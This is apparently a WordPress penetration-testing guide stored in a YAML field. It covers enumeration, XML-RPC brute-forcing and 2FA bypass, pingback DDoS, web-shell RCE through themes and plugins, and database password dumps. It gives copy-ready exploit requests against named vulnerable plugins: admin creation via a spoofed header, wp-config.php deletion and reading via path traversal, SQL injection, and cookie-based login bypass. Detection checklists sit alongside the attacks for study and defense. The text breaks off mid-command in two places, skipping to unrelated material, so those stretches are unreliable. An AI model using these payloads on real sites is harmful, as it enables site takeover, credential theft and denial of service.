## Preserved Source Material

````yaml
_body: "# Wordpress\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\n- **Uploaded** files go\
  \ to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\n- **Themes files can be found in /wp-content/themes/,** so\
  \ if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve**\
  \ you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\n\
  \n  - **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\n\
  \n- In **wp-config.php** you can find the root password of the database.\n- Default login paths to check: _**/wp-login.php,\
  \ /wp-login/, /wp-admin/, /wp-admin.php, /login/**_\n\n### **Main WordPress Files**\n\n- `index.php`\n- `license.txt` contains\
  \ useful information such as the version WordPress installed.\n- `wp-activate.php` is used for the email activation process\
  \ when setting up a new WordPress site.\n- Login folders (may be renamed to hide it):\n  - `/wp-admin/login.php`\n  - `/wp-admin/wp-login.php`\n\
  \  - `/login.php`\n  - `/wp-login.php`\n- `xmlrpc.php` is a file that represents a feature of WordPress that enables data\
  \ to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication\
  \ has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).\n- The `wp-content`\
  \ folder is the main directory where plugins and themes are stored.\n- `wp-content/uploads/` Is the directory where any\
  \ files uploaded to the platform are stored.\n- `wp-includes/` This is the directory where core files are stored, such as\
  \ certificates, fonts, JavaScript files, and widgets.\n- `wp-sitemap.xml` In Wordpress versions 5.5 and greater, Worpress\
  \ generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.\n\n**Post exploitation**\n\
  \n- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database\
  \ name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration\
  \ file can also be used to activate DEBUG mode, which can useful in troubleshooting.\n\n### Users Permissions\n\n- **Administrator**\n\
  - **Editor**: Publish and manages his and others posts\n- **Author**: Publish and manage his own posts\n- **Contributor**:\
  \ Write and manage his posts but cannot publish them\n- **Subscriber**: Browser posts and edit their profile\n\n## **Passive\
  \ Enumeration**\n\n### **Get WordPress version**\n\nCheck if you can find the files `/license.txt` or `/readme.html`\n\n\
  Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):\n\
  \n- grep\n\n```bash\ncurl https://victim.com/ | grep 'content=\"WordPress'\n```\n\n- `meta name`\n\n![](<../../images/image\
  \ (1111).png>)\n\n- CSS link files\n\n![](<../../images/image (533).png>)\n\n- JavaScript files\n\n![](<../../images/image\
  \ (524).png>)\n\n### Get Plugins\n\n```bash\ncurl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/\
  \ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F \"THIIIIS\" '{print $2}' | cut -d \"'\" -f2\n\
  ```\n\n### Get Themes\n\n```bash\ncurl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes'\
  \ | sed -E 's,href=|src=,THIIIIS,g' | awk -F \"THIIIIS\" '{print $2}' | cut -d \"'\" -f2\n```\n\n### Extract versions in\
  \ general\n\n```bash\ncurl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/\
  \ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F \"THIIIIS\" '{print $2}' | cut -d \"'\" -f2\n\
  \n```\n\n## Active enumeration\n\n### Plugins and Themes\n\nYou probably won't be able to find all the Plugins and Themes\
  \ passible. In order to discover all of them, you will need to **actively Brute Force a list of Plugins and Themes** (hopefully\
  \ for us there are automated tools that contains this lists).\n\n### Users\n\n- **ID Brute:** You get valid users from a\
  \ WordPress site by Brute Forcing users IDs:\n\n```bash\ncurl -s -I -X GET http://blog.example.com/?author=1\n```\n\nIf\
  \ the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id\
  \ is **invalid**.\n\n- **wp-json:** You can also try to get information about the users by querying:\n\n```bash\ncurl http://blog.example.com/wp-json/wp/v2/users\n\
  ```\n\nAnother `/wp-json/` endpoint that can reveal some information about users is:\n\n```bash\ncurl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL\n\
  ```\n\nNote that this endpoint only exposes users that have made a post. **Only information about the users that has this\
  \ feature enable will be provided**.\n\nAlso note that **/wp-json/wp/v2/pages** could leak IP addresses.\n\n- **Login username\
  \ enumeration**: When login in **`/wp-login.php`** the **message** is **different** is the indicated **username exists or\
  \ not**.\n\n### XML-RPC\n\nIf `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS\
  \ attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).\n\
  \nTo see if it is active try to access to _**/xmlrpc.php**_ and send this request:\n\n**Check**\n\n```html\n<methodCall>\n\
  <methodName>system.listMethods</methodName>\n<params></params>\n</methodCall>\n```\n\n![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)\n\
  \n**Credentials Bruteforce**\n\n**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** are some\
  \ of the methods that can be used to brute-force credentials. If you can find any of them you can send something like:\n\
  \n```html\n<methodCall>\n<methodName>wp.getUsersBlogs</methodName>\n<params>\n<param><value>admin</value></param>\n<param><value>pass</value></param>\n\
  </params>\n</methodCall>\n```\n\nThe message _\"Incorrect username or password\"_ inside a 200 code response should appear\
  \ if the credentials aren't valid.\n\n![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1)\
  \ (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2)\
  \ (4) (1).png>)\n\n![](<../../images/image (721).png>)\n\nUsing the correct credentials you can upload a file. In the response\
  \ the path will appears ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))\n\
  \n```html\n<?xml version='1.0' encoding='utf-8'?>\n<methodCall>\n\t<methodName>wp.uploadFile</methodName>\n\t<params>\n\t\
  \t<param><value><string>1</string></value></param>\n\t\t<param><value><string>username</string></value></param>\n\t\t<param><value><string>password</string></value></param>\n\
  \t\t<param>\n\t\t\t<value>\n\t\t\t\t<struct>\n\t\t\t\t\t<member>\n\t\t\t\t\t\t<name>name</name>\n\t\t\t\t\t\t<value><string>filename.jpg</string></value>\n\
  \t\t\t\t\t</member>\n\t\t\t\t\t<member>\n\t\t\t\t\t\t<name>type</name>\n\t\t\t\t\t\t<value><string>mime/type</string></value>\n\
  \t\t\t\t\t</member>\n\t\t\t\t\t<member>\n\t\t\t\t\t\t<name>bits</name>\n\t\t\t\t\t\t<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>\n\
  \t\t\t\t\t</member>\n\t\t\t\t</struct>\n\t\t\t</value>\n\t\t</param>\n\t</params>\n</methodCall>\n```\n\nAlso there is a\
  \ **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same\
  \ request:\n\n<figure><img src=\"../../images/image (628).png\" alt=\"\"><figcaption></figcaption></figure>\n\n**Bypass\
  \ 2FA**\n\nThis method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have\
  \ valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds\
  \ bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might\
  \ still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)\n\
  \n**DDoS or port scanning**\n\nIf you can find the method _**pingback.ping**_ inside the list you can make the Wordpress\
  \ send an arbitrary request to any host/port.\\\nThis can be used to ask **thousands** of Wordpress **sites** to **access**\
  \ one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal\
  \ **network** (you can indicate any port).\n\n```html\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params><param>\n\
  <value><string>http://<YOUR SERVER >:<port></string></value>\n</param><param><value><string>http://<SOME VALID BLOG FROM\
  \ THE SITE ></string>\n</value></param></params>\n</methodCall>\n```\n\n![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)\n\
  \nIf you get **faultCode** with a value **greater** then **0** (17), it means the port is open.\n\nTake a look to the use\
  \ of **`system.multicall`** in the previous section to learn how to abuse this method to cause DDoS.\n\n**DDoS**\n\n```html\n\
  <methodCall>\n    <methodName>pingback.ping</methodName>\n    <params>\n        <param><value><string>http://target/</string></value></param>\n\
  \        <param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>\n    </params>\n\
  </methodCall>\n```\n\n![](<../../images/image (110).png>)\n\n### wp-cron.php DoS\n\nThis file usually exists under the root\
  \ of the Wordpress site: **`/wp-cron.php`**\\\nWhen this file is **accessed** a \"**heavy**\" MySQL **query** is performed,\
  \ so I could be used by **attackers** to **cause** a **DoS**.\\\nAlso, by default, the `wp-cron.php` is called on every\
  \ page load (anytime a client requests any Wordpress page), which on high-traffic sites can cause problems (DoS).\n\nIt\
  \ is recommended to disable Wp-Cron and create a real cronjob inside the host that perform the needed actions in a regular\
  \ interval (without causing issues).\n\n### /wp-json/oembed/1.0/proxy - SSRF\n\nTry to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_\
  \ and the Worpress site may make a request to you.\n\nThis is the response when it doesn't work:\n\n![](<../../images/image\
  \ (365).png>)\n\n## SSRF\n\n\n{{#ref}}\nhttps://github.com/t0gu/quickpress/blob/master/core/requests.go\n{{#endref}}\n\n\
  This tool checks if the **methodName: pingback.ping** and for the path **/wp-json/oembed/1.0/proxy** and if exists, it tries\
  \ to exploit them.\n\n## Automatic Tools\n\n```bash\ncmsmap -s http://www.domain.com -t 2 -a \"Mozilla/5.0 (Windows NT 10.0;\

  \ is a curiosity. IN the CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)\
  \ you could flip 1 bit from any wordpress file. So you could flip the position `5389` of the file `/var/www/html/wp-includes/user.php`\
  \ to NOP the NOT (`!`) operation.\n\n```php\n    if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {\n\
  \            return new WP_Error(\n```\n\n## **Panel RCE**\n\n**Modifying a php from the theme used (admin credentials needed)**\n\
  \nAppearance → Theme Editor → 404 Template (at the right)\n\nChange the content for a php shell:\n\n![](<../../images/image\

  \n### MSF\n\nYou can use:\n\n```bash\nuse exploit/unix/webapp/wp_admin_shell_upload\n```\n\nto get a session.\n\n## Plugin\
  \ RCE\n\n### PHP plugin\n\nIt may be possible to upload .php files as a plugin.\\\nCreate your php backdoor using for example:\n\
  \n![](<../../images/image (183).png>)\n\nThen add a new plugin:\n\n![](<../../images/image (722).png>)\n\nUpload plugin\
  \ and press Install Now:\n\n![](<../../images/image (249).png>)\n\nClick on Procced:\n\n![](<../../images/image (70).png>)\n\
  \nProbably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:\n\n![](<../../images/image\
  \ (462).png>)\n\nAccess it and you will see the URL to execute the reverse shell:\n\n![](<../../images/image (1006).png>)\n\
  \n### Uploading and activating malicious plugin\n\nThis method involves the installation of a malicious plugin known to\
  \ be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard\
  \ as follows:\n\n1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).\n\
  2. **Plugin Installation**:\n   - Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.\n\
  \   - Upload the zip file of the downloaded plugin.\n3. **Plugin Activation**: Once the plugin is successfully installed,\
  \ it must be activated through the dashboard.\n4. **Exploitation**:\n   - With the plugin \"reflex-gallery\" installed and\
  \ activated, it can be exploited as it is known to be vulnerable.\n   - The Metasploit framework provides an exploit for\
  \ this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established,\
  \ granting unauthorized access to the site.\n   - It's noted that this is just one of the many methods to exploit a WordPress\
  \ site.\n\nThe content includes visual aids depicting the steps in the WordPress dashboard for installing and activating\
  \ the plugin. However, it's important to note that exploiting vulnerabilities in this manner is illegal and unethical without\
  \ proper authorization. This information should be used responsibly and only in a legal context, such as penetration testing\
  \ with explicit permission.\n\n**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)\n\
  \n## From XSS to RCE\n\n- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed\
  \ to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities\
  \ in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html).\
  \ It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**\n  - _**Privilege Escalation:**_\
  \ Creates an user in WordPress.\n  - _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to\
  \ WordPress.\n  - _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.\n  - _**(RCE) Built-In Theme Edit:**_\
  \ Edit a Built-In Themes in WordPress.\n  - _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.\n\
  \n## Post Exploitation\n\nExtract usernames and passwords:\n\n```bash\nmysql -u <USERNAME> --password=<PASSWORD> -h localhost\
  \ -e \"use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;\"\n```\n\nChange admin password:\n\n```bash\n\
  mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e \"use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE\
  \ ID = 1;\"\n```\n\n## Wordpress Plugins Pentest\n\n### Attack Surface\n\nKnowing how a Wordpress plugin can expose functionality\
  \ is key in order to find vulnerabilities on its functionality. You can find how a plugin might expose functionality in\
  \ the following bullet points and some example of vulnerable plugins in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).\n\
  \n- **`wp_ajax`**\n\nOne of the ways a plugin can expose functions to uses if via AJAX handlers. These ones could contain\
  \ logic, authorization, or authentication bugs. Moreover, it's kind of frquelty that these functions are going to base both\
  \ the authentication and authorization in the existence of a wordpress nonce which **any user authenticated in the Wordpress\
  \ instance might have** (independently of its role).\n\nThese are the functions that can be used to expose a function in\
  \ a plugin:\n\n```php\nadd_action( 'wp_ajax_action_name', array(&$this, 'function_name'));\nadd_action( 'wp_ajax_nopriv_action_name',\
  \ array(&$this, 'function_name'));\n```\n\n**The use of `nopriv` makes the endpoint accessible by any users (even unathenticated\
  \ ones).**\n\n> [!CAUTION]\n> Moreover, if the function is just checking the authorization of the user with the function\
  \ `wp_verify_nonce`, this function is just checking the user is loggedin, it isn't usually checking the role of the user.\
  \ So low privileged users might have access to high privileged actions.\n\n- **REST API**\n\nIt's also possible to expose\
  \ functions from wordpress registering a rest AP using the `register_rest_route` function:\n\n```php\nregister_rest_route(\n\
  \    $this->namespace, '/get/', array(\n        'methods' => WP_REST_Server::READABLE,\n        'callback' => array($this,\
  \ 'getData'),\n        'permission_callback' => '__return_true'\n    )\n);\n```\n\nThe `permission_callback` is a callback\
  \ to function that checks if a given user is authorized to call the API method.\n\n**If the built-in `__return_true` function\
  \ is used, it'll simply skip user permissions check.**\n\n- **Direct access to the php file**\n\nOf course, Wordpress uses\
  \ PHP and files inside plugins are directly accessible from the web. So, in case a plugin is exposing any vulnerable functionality\
  \ that is triggered just accessing the file, it's going to be exploitable by any user.\n\n### Trusted-header REST impersonation\
  \ (WooCommerce Payments ≤ 5.6.1)\n\nSome plugins implement “trusted header” shortcuts for internal integrations or reverse\
  \ proxies and then use that header to set the current user context for REST requests. If the header is not cryptographically\
  \ bound to the request by an upstream component, an attacker can spoof it and hit privileged REST routes as an administrator.\n\
  \n- Impact: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.\n\
  - Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).\n-\
  \ Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.\n\nPoC\n\n```http\nPOST /wp-json/wp/v2/users\
  \ HTTP/1.1\nHost: <WP HOST>\nUser-Agent: Mozilla/5.0\nAccept: application/json\nContent-Type: application/json\nX-Wcpay-Platform-Checkout-User:\
  \ 1\nContent-Length: 114\n\n{\"username\": \"honeypot\", \"email\": \"wafdemo@patch.stack\", \"password\": \"demo\", \"\
  roles\": [\"administrator\"]}\n```\n\nWhy it works\n\n- The plugin maps a client-controlled header to authentication state\
  \ and skips capability checks.\n- WordPress core expects `create_users` capability for this route; the plugin hack bypasses\
  \ it by directly setting the current user context from the header.\n\nExpected success indicators\n\n- HTTP 201 with a JSON\
  \ body describing the created user.\n- A new admin user visible in `wp-admin/users.php`.\n\nDetection checklist\n\n- Grep\
  \ for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`,\
  \ `wp_set_auth_cookie()`).\n- Review REST registrations for privileged callbacks that lack robust `permission_callback`\
  \ checks and instead rely on request headers.\n- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`)\
  \ inside REST handlers that are gated only by header values.\n\n### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv\
  \ (Litho Theme <= 3.0)\n\nWordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_`\
  \ hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive\
  \ action must additionally implement:\n\n1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`),\
  \ and\n2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and\n3. **Strict input sanitisation\
  \ / validation**.\n\nThe Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and\
  \ ended up shipping the following code (simplified):\n\n```php\nfunction litho_remove_font_family_action_data() {\n    if\
  \ ( empty( $_POST['fontfamily'] ) ) {\n        return;\n    }\n    $fontfamily = str_replace( ' ', '-', $_POST['fontfamily']\
  \ );\n    $upload_dir = wp_upload_dir();\n    $srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] )\
  \ ) . '/litho-fonts/' . $fontfamily;\n    $filesystem = Litho_filesystem::init_filesystem();\n\n    if ( file_exists( $srcdir\
  \ ) ) {\n        $filesystem->delete( $srcdir, FS_CHMOD_DIR );\n    }\n    die();\n}\nadd_action( 'wp_ajax_litho_remove_font_family_action_data',\
  \        'litho_remove_font_family_action_data' );\nadd_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data'\
  \ );\n```\n\nIssues introduced by this snippet:\n\n* **Unauthenticated access** – the `wp_ajax_nopriv_` hook is registered.\n\
  * **No nonce / capability check** – any visitor can hit the endpoint.\n* **No path sanitisation** – the user–controlled\
  \ `fontfamily` string is concatenated to a filesystem path without filtering, allowing classic `../../` traversal.\n\n####\
  \ Exploitation\n\nAn attacker can delete any file or directory **below the uploads base directory** (normally `<wp-root>/wp-content/uploads/`)\
  \ by sending a single HTTP POST request:\n\n```bash\ncurl -X POST https://victim.com/wp-admin/admin-ajax.php \\\n     -d\
  \ 'action=litho_remove_font_family_action_data' \\\n     -d 'fontfamily=../../../../wp-config.php'\n```\n\nBecause `wp-config.php`\
  \ lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress\
  \ into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB\
  \ configuration and creates an admin user).\n\nOther impactful targets include plugin/theme `.php` files (to break security\
  \ plugins) or `.htaccess` rules.\n\n#### Detection checklist\n\n* Any `add_action( 'wp_ajax_nopriv_...')` callback that\
  \ calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).\n* Concatenation of unsanitised user\
  \ input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).\n* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.\n\
  \n---\n\n### Privilege escalation via stale role restoration and missing authorization (ASE \"View Admin as Role\")\n\n\
  Many plugins implement a \"view as role\" or temporary role-switching feature by saving the original role(s) in user meta\
  \ so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`)\
  \ and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.\n\
  \nA real-world example was found in the Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). The reset branch restored\
  \ roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`,\
  \ but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding\
  \ the saved roles from user meta `_asenha_view_admin_as_original_roles`:\n\n```php\n// Simplified vulnerable pattern\nif\
  \ ( isset( $_REQUEST['reset-for'] ) ) {\n    $reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );\n    $usernames\
  \ = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];\n\n    if ( in_array( $reset_for_username, $usernames,\
  \ true ) ) {\n        $u = get_user_by( 'login', $reset_for_username );\n        foreach ( $u->roles as $role ) { $u->remove_role(\
  \ $role ); }\n        $orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );\n        foreach\
  \ ( $orig as $r ) { $u->add_role( $r ); }\n    }\n}\n```\n\nWhy it’s exploitable\n\n- Trusts `$_REQUEST['reset-for']` and\
  \ a plugin option without server-side authorization.\n- If a user previously had higher privileges saved in `_asenha_view_admin_as_original_roles`\
  \ and was downgraded, they can restore them by hitting the reset path.\n- In some deployments, any authenticated user could\
  \ trigger a reset for another username still present in `viewing_admin_as_role_are` (broken authorization).\n\nExploitation\
  \ (example)\n\n```bash\n# While logged in as the downgraded user (or any auth user able to trigger the code path),\n# hit\
  \ any route that executes the role-switcher logic and include the reset parameter.\n# The plugin uses $_REQUEST, so GET\
  \ or POST works. The exact route depends on the plugin hooks.\ncurl -s -k -b 'wordpress_logged_in=...' \\\n  'https://victim.example/wp-admin/?reset-for=<your_username>'\n\
  ```\n\nOn vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively\
  \ escalating privileges.\n\nDetection checklist\n\n- Look for role-switching features that persist “original roles” in user\
  \ meta (e.g., `_asenha_view_admin_as_original_roles`).\n- Identify reset/restore paths that:\n  - Read usernames from `$_REQUEST`\
  \ / `$_GET` / `$_POST`.\n  - Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()`\
  \ / `check_admin_referer()`.\n  - Authorize based on a plugin option array (e.g., `viewing_admin_as_role_are`) instead of\
  \ the actor’s capabilities.\n\n---\n\n### Unauthenticated privilege escalation via cookie‑trusted user switching on public\
  \ init (Service Finder “sf-booking”)\n\nSome plugins wire user-switching helpers to the public `init` hook and derive identity\
  \ from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability\
  \ and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.\n\nTypical vulnerable pattern\
  \ (simplified from Service Finder Bookings ≤ 6.1):\n\n```php\nfunction service_finder_submit_user_form(){\n    if ( isset($_GET['switch_user'])\
  \ && is_numeric($_GET['switch_user']) ) {\n        $user_id = intval( sanitize_text_field($_GET['switch_user']) );\n   \
  \     service_finder_switch_user($user_id);\n    }\n    if ( isset($_GET['switch_back']) ) {\n        service_finder_switch_back();\n\
  \    }\n}\nadd_action('init', 'service_finder_submit_user_form');\n\nfunction service_finder_switch_back() {\n    if ( isset($_COOKIE['original_user_id'])\
  \ ) {\n        $uid = intval($_COOKIE['original_user_id']);\n        if ( get_userdata($uid) ) {\n            wp_set_current_user($uid);\n\
  \            wp_set_auth_cookie($uid);  // \U0001F525 sets auth for attacker-chosen UID\n            do_action('wp_login',\
  \ get_userdata($uid)->user_login, get_userdata($uid));\n            setcookie('original_user_id', '', time() - 3600, '/');\n\
  \            wp_redirect( admin_url('admin.php?page=candidates') );\n            exit;\n        }\n        wp_die('Original\
  \ user not found.');\n    }\n    wp_die('No original user found to switch back to.');\n}\n```\n\nWhy it’s exploitable\n\n\
  - Public `init` hook makes the handler reachable by unauthenticated users (no `is_user_logged_in()` guard).\n- Identity\
  \ is derived from a client-modifiable cookie (`original_user_id`).\n- Direct call to `wp_set_auth_cookie($uid)` logs the\
  \ requester in as that user without any capability/nonce checks.\n\nExploitation (unauthenticated)\n\n```http\nGET /?switch_back=1\
  \ HTTP/1.1\nHost: victim.example\nCookie: original_user_id=1\nUser-Agent: PoC\nConnection: close\n```\n\n---\n\n### WAF\
  \ considerations for WordPress/plugin CVEs\n\nGeneric edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many\
  \ high‑impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine\
  \ understands WordPress routes and plugin semantics.\n\nOffensive notes\n\n- Target plugin-specific endpoints with clean\
  \ payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.\n- Exercise unauth\
  \ paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed\
  \ without obfuscation.\n- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download,\
  \ LFI, open redirect.\n\nDefensive notes\n\n- Don’t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer,\
  \ vulnerability-specific virtual patches or update quickly.\n- Prefer positive-security checks in code (capabilities, nonces,\
  \ strict input validation) over negative regex filters.\n\n## WordPress Protection\n\n### Regular Updates\n\nMake sure WordPress,\
  \ plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:\n\n```bash\ndefine(\
  \ 'WP_AUTO_UPDATE_CORE', true );\nadd_filter( 'auto_update_plugin', '__return_true' );\nadd_filter( 'auto_update_theme',\
  \ '__return_true' );\n```\n\nAlso, **only install trustable WordPress plugins and themes**.\n\n### Security Plugins\n\n\
  - [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)\n- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)\n\
  - [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)\n\n### **Other Recommendations**\n\n- Remove\
  \ default **admin** user\n- Use **strong passwords** and **2FA**\n- Periodically **review** users **permissions**\n- **Limit\
  \ login attempts** to prevent Brute Force attacks\n- Rename **`wp-admin.php`** file and only allow access internally or\
  \ from certain IP addresses.\n\n\n### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)\n\
  \nThe WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable\
  \ code inside `modules/category/model.php::validateFormData()`:\n\n```php\n$category  = WPJOBPORTALrequest::getVar('parentid');\n\
  $inquery   = ' ';\nif ($category) {\n    $inquery .= \" WHERE parentid = $category \";   // <-- direct concat ✗\n}\n$query\
  \  = \"SELECT max(ordering)+1 AS maxordering FROM \"\n        . wpjobportal::$_db->prefix . \"wj_portal_categories \" .\
  \ $inquery; // executed later\n```\n\nIssues introduced by this snippet:\n\n1. **Unsanitised user input** – `parentid` comes\
  \ straight from the HTTP request.\n2. **String concatenation inside the WHERE clause** – no `is_numeric()` / `esc_sql()`\
  \ / prepared statement.\n3. **Unauthenticated reachability** – although the action is executed through `admin-post.php`,\
  \ the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding\
  \ the shortcode `[wpjobportal_my_resumes]`.\n\n#### Exploitation\n\n1. Grab a fresh nonce:\n   ```bash\n   curl -s https://victim.com/my-resumes/\
  \ | grep -oE 'name=\"_wpnonce\" value=\"[a-f0-9]+' | cut -d'\"' -f4\n   ```\n2. Inject arbitrary SQL by abusing `parentid`:\n\
  \   ```bash\n   curl -X POST https://victim.com/wp-admin/admin-post.php \\\n        -d 'task=savecategory' \\\n        -d\
  \ '_wpnonce=<nonce>' \\\n        -d 'parentid=0 OR 1=1-- -' \\\n        -d 'cat_title=pwn' -d 'id='\n   ```\n   The response\
  \ discloses the result of the injected query or alters the database, proving SQLi.\n\n\n### Unauthenticated Arbitrary File\
  \ Download / Path Traversal (WP Job Portal <= 2.3.2)\n\nAnother task, **downloadcustomfile**, allowed visitors to download\
  \ **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:\n\
  \n```php\n$file = $path . '/' . $file_name;\n...\necho $wp_filesystem->get_contents($file); // raw file output\n```\n\n\
  `$file_name` is attacker-controlled and concatenated **without sanitisation**.  Again, the only gate is a **CSRF nonce**\
  \ that can be fetched from the resume page.\n\n#### Exploitation\n\n```bash\ncurl -G https://victim.com/wp-admin/admin-post.php\
  \ \\\n     --data-urlencode 'task=downloadcustomfile' \\\n     --data-urlencode '_wpnonce=<nonce>' \\\n     --data-urlencode\
  \ 'upload_for=resume' \\\n     --data-urlencode 'entity_id=1' \\\n     --data-urlencode 'file_name=../../../wp-config.php'\n\
  ```\nThe server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.\n\n## Unauthenticated\
  \ account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)\n\nMany themes/plugins ship \"social login\"\
  \ helpers exposed via admin-ajax.php. If an unauthenticated AJAX action (wp_ajax_nopriv_...) trusts client-supplied identifiers\
  \ when provider data is missing and then calls wp_set_auth_cookie(), this becomes a full authentication bypass.\n\nTypical\
